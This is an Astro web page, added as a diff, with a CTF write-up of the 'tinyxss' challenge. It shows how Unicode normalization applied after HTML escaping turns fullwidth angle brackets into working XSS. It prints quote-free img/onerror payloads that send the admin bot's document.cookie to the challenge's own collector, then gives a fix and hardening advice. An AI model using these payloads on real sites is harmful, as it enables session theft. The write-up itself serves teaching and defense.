@@ -1,0 +1,379 @@
+---
+import Layout from "@/layouts/Layout.astro";
+import Nav from "@/components/nav.astro";
+---
+
+<Layout title="tinyxss — CATF Writeup">
+  <Nav />
+  <main class="max-w-3xl mx-auto pt-28 md:pt-32 pb-16 text-[var(--white)]">
+    <a
+      href="/writeups/"
+      class="inline-flex items-center gap-2 text-sm text-[var(--white-icon)] hover:text-white transition-colors mb-8"
+    >
+      <svg
+        xmlns="http://www.w3.org/2000/svg"
+        viewBox="0 0 24 24"
+        fill="currentColor"
+        class="size-4"
+      >
+        <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"
+        ></path>
+      </svg>
+      Back to writeups
+    </a>
+
+    <header class="mb-10">
+      <div class="flex flex-wrap items-center gap-3 mb-3 text-sm">
+        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[var(--sec)]">
+          CATF CTF
+        </span>
+        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[var(--white-icon)]">
+          Web
+        </span>
+        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[#A9FF5B]">
+          Easy
+        </span>
+        <span class="text-[var(--white-icon)]">Nov 2026</span>
+      </div>
+      <h1 class="text-4xl md:text-5xl font-semibold mb-3">tinyxss</h1>
+      <p class="text-[var(--white-icon)]">
+        Fullwidth Unicode vs. HTML escaping — a tiny XSS with a huge confidence
+        problem.
+      </p>
+    </header>
+
+    <figure class="mb-10">
+      <img
+        src="/images/tinyxss/cover.png"
+        alt="tinyxss challenge landing page"
+        class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+      />
+    </figure>
+
+    <article class="writeup space-y-5">
+      <p>
+        <strong>tinyxss</strong> is a small Flask challenge with an admin bot.
+        The app promises that it HTML-encodes input and is therefore
+        “completely invincible”. The bug is one line long: it escapes first,
+        then applies Unicode NFKC normalization, which turns fullwidth angle
+        brackets back into real HTML syntax after the escaping already ran.
+      </p>
+      <p>
+        The admin bot stores the flag in a <code>flag</code> cookie without
+        <code>HttpOnly</code>, so the final step is a normal cookie theft — sent
+        to the challenge’s own collector because the bot cannot reach the
+        internet.
+      </p>
+
+      <h2>TL;DR</h2>
+      <p>
+        Use <code>＜</code> (U+FF1C) and <code>＞</code> (U+FF1E) instead of
+        <code>&lt;</code> and <code>&gt;</code>. MarkupSafe does not escape
+        them; NFKC maps them to ASCII angle brackets <em>after</em> escaping.
+        The quote-free payload below creates an
+        <code>&lt;img&gt;</code> tag whose <code>onerror</code> redirects the
+        admin browser to the local collector:
+      </p>
+      <pre><code>＜img src=x onerror=location=String.fromCharCode(47,99,111,108,108,101,99,116,47,...)+encodeURIComponent(document.cookie)＞</code></pre>
+      <p>
+        The full path is built with <code>String.fromCharCode()</code> so the
+        payload needs no quotes and no slashes. The result:
+      </p>
+      <pre><code>flag=CATF&#123;test_flag_do_not_submit&#125;</code></pre>
+      <p class="text-sm text-[var(--white-icon)]">
+        Note: the provided archive does not ship the deployment’s
+        <code>flag.env</code>, so this local reproduction shows the bot’s
+        built-in test flag. The same chain reads the real flag on a live
+        deployment.
+      </p>
+
+      <h2>Looking at the Source</h2>
+      <p>
+        The challenge gives us the application and the bot. The interesting
+        function lives in <code>web/app.py</code>:
+      </p>
+      <pre><code>def vulnerable_render(user_input: str) -&gt; str:
+    escaped = str(escape(user_input))
+    return unicodedata.normalize("NFKC", escaped)</code></pre>
+      <p>
+        The order is the vulnerability:
+      </p>
+      <ul class="list-disc list-inside space-y-1">
+        <li><strong>1.</strong> HTML-escape the input.</li>
+        <li><strong>2.</strong> Normalize the <em>escaped</em> string with NFKC.</li>
+        <li><strong>3.</strong> Insert the result into the page as HTML.</li>
+      </ul>
+      <p>
+        The index route reflects the input in two places. The value of the
+        search box is escaped normally, but the result section uses
+        <code>vulnerable_render()</code>. There is no CSP, so a successfully
+        injected handler runs.
+      </p>
+
+      <h2>The Bug: Fullwidth Angle Brackets</h2>
+      <p>
+        MarkupSafe’s <code>escape()</code> replaces <code>&amp;</code>,
+        <code>&lt;</code>, <code>&gt;</code>, <code>"</code> and
+        <code>'</code>. It knows nothing about Unicode lookalikes. NFKC,
+        however, performs compatibility normalization — and the fullwidth
+        forms are compatibility characters:
+      </p>
+      <pre><code>U+FF1C  ＜   -&gt;  &lt;
+U+FF1E  ＞   -&gt;  &gt;</code></pre>
+      <p>So the pipeline behaves like this:</p>
+      <pre><code>input     : ＜img src=x onerror=...＞
+escape()  : ＜img src=x onerror=...＞   (unchanged)
+NFKC      : &lt;img src=x onerror=...&gt;   (real tag)
+browser   : creates an img element and fires onerror</code></pre>
+      <p>
+        That is the entire trick: the escaping routine runs before the
+        transformation that recreates the characters it was supposed to
+        neutralize.
+      </p>
+      <p>
+        One consequence matters for the payload: quotes are escaped to
+        <code>&amp;quot;</code> and <code>&amp;#39;</code>, and NFKC does not
+        turn those back. Any quoted JavaScript inside an attribute therefore
+        becomes inert. The payload must be quote-free.
+      </p>
+
+      <h2>Step 1 — Create an Inbox</h2>
+      <p>
+        The challenge ships its own collector, which is exactly what we need
+        because the admin bot is attached only to an internal Docker network.
+        Open <code>/report</code> and click <strong>Create inbox</strong>.
+      </p>
+      <figure>
+        <img
+          src="/images/tinyxss/report-page.png"
+          alt="Tiny Admin report page with a created inbox"
+          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+        />
+        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
+          Creating an inbox gives us <code>/collect/&lt;id&gt;</code>.
+        </figcaption>
+      </figure>
+      <p>
+        The page shows the collector URL for the new inbox. We will send the
+        admin’s cookie to that path.
+      </p>
+
+      <h2>Step 2 — Confirm the Injection</h2>
+      <p>
+        Before stealing anything, it is worth proving that the reflection is
+        real HTML and that JavaScript executes. This payload injects a heading
+        and turns the page background red with an unquoted handler:
+      </p>
+      <pre><code>＜h2 style=color:red＞XSS confirmed＜/h2＞＜img src=x onerror=document.body.style.backgroundColor=String.fromCharCode(114,101,100)＞</code></pre>
+      <p>
+        Put it in the <code>q</code> parameter (URL-encoded) and load the page:
+      </p>
+      <pre><code>/?q=%EF%BC%9Ch2%20style%3Dcolor%3Ared%EF%BC%9EXSS%20confirmed%EF%BC%9C%2Fh2%EF%BC%9E...</code></pre>
+      <figure>
+        <img
+          src="/images/tinyxss/xss-proof.png"
+          alt="Injected heading and red background proving XSS"
+          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+        />
+        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
+          The heading and the red background both come from the injected
+          payload.
+        </figcaption>
+      </figure>
+      <p>
+        The broken image icon is the <code>&lt;img&gt;</code> tag, and the red
+        background is <code>onerror</code> executing. No quotes were needed:
+        <code>style=color:red</code> is a valid unquoted attribute, and
+        <code>String.fromCharCode(114,101,100)</code> builds the string
+        <code>"red"</code> at runtime.
+      </p>
+
+      <h2>Step 3 — Build the Exfiltration Payload</h2>
+      <p>
+        The bot creates a fresh browser context and adds the flag as a
+        JavaScript-readable cookie for the challenge origin:
+      </p>
+      <pre><code>name: 'flag', value: FLAG, httpOnly: false, sameSite: 'Lax'</code></pre>
+      <p>
+        Because the bot only visits URLs on the same origin and has no internet
+        access, the payload must exfiltrate to the local collector. The target
+        path is:
+      </p>
+      <pre><code>/collect/&lt;inbox_id&gt;?d=</code></pre>
+      <p>
+        We need to navigate there and append <code>document.cookie</code>.
+        Quotes are unavailable, so the path is encoded as character codes and
+        the cookie is URL-encoded:
+      </p>
+      <pre><code>location=String.fromCharCode(47,99,111,108,108,101,99,116,47,...)+encodeURIComponent(document.cookie)</code></pre>
+      <p>
+        The complete payload used in the screenshots is:
+      </p>
+      <pre><code>＜img src=x onerror=location=String.fromCharCode(47,99,111,108,108,101,99,116,47,87,79,72,84,97,117,106,45,110,77,111,63,100,61)+encodeURIComponent(document.cookie)＞</code></pre>
+      <p>
+        <code>String.fromCharCode()</code> avoids quotes, slashes and
+        percent-signs inside the handler.
+        <code>encodeURIComponent()</code> keeps cookie values safe if they
+        contain characters such as <code>+</code>, <code>&amp;</code> or
+        <code>#</code>.
+      </p>
+      <div class="rounded-xl border border-[var(--white-icon-tr)] bg-[#1414149c] p-4 text-sm">
+        <strong>Gotcha:</strong> when the payload is placed in a query string,
+        the <code>+</code> in <code>+encodeURIComponent(...)</code> must be
+        percent-encoded as <code>%2B</code>. Otherwise Flask decodes it to a
+        space, the unquoted attribute ends early, and the handler breaks.
+      </div>
+
+      <h2>Step 4 — Report It to Tiny Admin</h2>
+      <p>
+        Paste the URL-encoded local URL into the report form and submit it. The
+        bot resolves relative URLs against the challenge origin, opens the page
+        in a new context with the flag cookie, and waits one second:
+      </p>
+      <pre><code>/?q=%EF%BC%9Cimg%20src%3Dx%20onerror%3Dlocation%3DString.fromCharCode(...)%2BencodeURIComponent(document.cookie)%EF%BC%9E</code></pre>
+      <figure>
+        <img
+          src="/images/tinyxss/report-sent.png"
+          alt="Report accepted by the admin bot"
+          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+        />
+        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
+          Tiny Admin visited the reported URL.
+        </figcaption>
+      </figure>
+      <p>
+        The injected <code>&lt;img&gt;</code> fails to load immediately, so
+        <code>onerror</code> runs well inside the one-second window. The
+        handler sets <code>location</code> to the collector and appends the
+        cookie:
+      </p>
+      <pre><code>GET /collect/&lt;inbox_id&gt;?d=flag%3DCATF%7B...%7D HTTP/1.1</code></pre>
+
+      <h2>Step 5 — Read the Inbox</h2>
+      <p>
+        Open <code>/inbox/&lt;inbox_id&gt;</code>. The collector stored the
+        query parameter, and the inbox renders it:
+      </p>
+      <figure>
+        <img
+          src="/images/tinyxss/inbox-flag.png"
+          alt="Inbox showing the stolen flag cookie"
+          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
+        />
+        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
+          The admin bot’s cookie arrived in the local inbox.
+        </figcaption>
+      </figure>
+      <p>
+        That is the flag cookie. On the live deployment the value is the real
+        <code>CATF&#123;...&#125;</code> flag; in this local reproduction the
+        bot falls back to its built-in test value because no
+        <code>flag.env</code> was supplied.
+      </p>
+
+      <h2>Why It Works</h2>
+      <ul class="list-disc list-inside space-y-1">
+        <li><strong>Wrong order:</strong> escaping runs before NFKC, so normalization can reintroduce HTML metacharacters.</li>
+        <li><strong>Unicode lookalikes:</strong> <code>＜</code>/<code>＞</code> are ignored by MarkupSafe but normalized to <code>&lt;</code>/<code>&gt;</code>.</li>
+        <li><strong>Quote-free JS:</strong> <code>String.fromCharCode()</code> builds paths and strings without quotes, which would be escaped.</li>
+        <li><strong>Readable cookie:</strong> the bot stores the flag with <code>httpOnly: false</code>, so <code>document.cookie</code> exposes it.</li>
+        <li><strong>Same-origin collector:</strong> the bot has no internet, but it can reach the challenge’s own <code>/collect</code> endpoint.</li>
+        <li><strong>Immediate trigger:</strong> a broken <code>&lt;img&gt;</code> fires <code>onerror</code> without user interaction, inside the bot’s one-second wait.</li>
+      </ul>
+
+      <h2>Fix</h2>
+      <p>
+        Normalize first, then escape. Escaping must be the last transformation
+        before the value reaches HTML:
+      </p>
+      <pre><code>def safe_render(user_input: str) -&gt; str:
+    normalized = unicodedata.normalize("NFKC", user_input)
+    return str(escape(normalized))</code></pre>
+      <p>
+        Even better, stop building HTML with string replacement. Use a
+        context-aware template engine (Jinja2 autoescaping) and pass the
+        reflected value as data, so the escaping happens at render time in the
+        correct context. Additional hardening for the bot:
+      </p>
+      <ul class="list-disc list-inside space-y-1">
+        <li>Mark the flag cookie <code>HttpOnly</code> so JavaScript cannot read it.</li>
+        <li>Add a restrictive Content Security Policy as defense in depth.</li>
+        <li>Do not normalize values after escaping — any post-escape transformation invalidates the escaping guarantee.</li>
+      </ul>
+
+      <h2>Final Thoughts</h2>
+      <p>
+        This is a great example of why “we HTML-escape everything” is not a
+        complete answer. The escape was correct; the pipeline around it was
+        not. A single normalization call after escaping was enough to turn a
+        harmless-looking fullwidth character into a working XSS.
+      </p>
+      <p>Thanks for the read! 🐛</p>
+    </article>
+
+    <div class="mt-12 pt-8 border-t border-[#ffffff10] flex justify-between items-center">
+      <a
+        href="/writeups/"
+        class="inline-flex items-center gap-2 text-sm text-[var(--white-icon)] hover:text-white transition-colors"
+      >
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="size-4">
+          <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"></path>
+        </svg>
+        Back to writeups
+      </a>
+    </div>
+  </main>
+</Layout>
+
+<style>
+  .writeup {
+    font-size: 1.05rem;
+    line-height: 1.8;
+    color: var(--white);
+  }
+
+  .writeup h2 {
+    font-size: 1.75rem;
+    font-weight: 600;
+    color: var(--white);
+    padding-top: 1.5rem;
+  }
+
+  .writeup strong {
+    color: #fff;
+  }
+
+  .writeup code {
+    background: #1414149c;
+    border: 1px solid var(--white-icon-tr);
+    border-radius: 0.4rem;
+    padding: 0.1rem 0.4rem;
+    font-size: 0.85em;
+    color: var(--sec);
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    word-break: break-all;
+  }
+
+  .writeup pre {
+    background: #1414149c;
+    border: 1px solid var(--white-icon-tr);
+    border-radius: 1rem;
+    padding: 1rem 1.25rem;
+    overflow-x: auto;
+  }
+
+  .writeup pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: #dfdfdf;
+    font-size: 0.9rem;
+    line-height: 1.7;
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+  }
+
+  .writeup figure img {
+    display: block;
+  }
+</style>
